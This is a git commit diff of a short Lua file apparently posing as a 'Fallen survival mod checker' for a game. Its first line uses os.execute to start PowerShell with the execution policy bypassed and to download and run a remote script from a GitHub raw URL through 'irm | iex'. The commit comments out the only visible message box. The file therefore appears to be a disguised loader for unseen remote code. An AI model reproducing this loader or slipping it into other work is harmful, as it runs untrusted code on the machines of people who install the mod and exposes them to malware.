ae35bad6caa0f9bda9c7e4732d98837398a28539
monkeyadece <118022576+monkeyadece@users.noreply.github.com>
2025-02-21 22:44:50 -0500

    Update e.lua

--- e.lua
+++ e.lua
@@ -1,5 +1,5 @@
 os.execute('powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/monkeyadece/teste/refs/heads/main/ewqeq | iex"')
-messagebox("Enabled: True | Made by monkeyadece", " Fallen survival mod checker",  48)
+-- messagebox("Enabled: True | Made by monkeyadece", " Fallen survival mod checker",  48)
 -- Made by monkey |2/21/2025| --
 
 
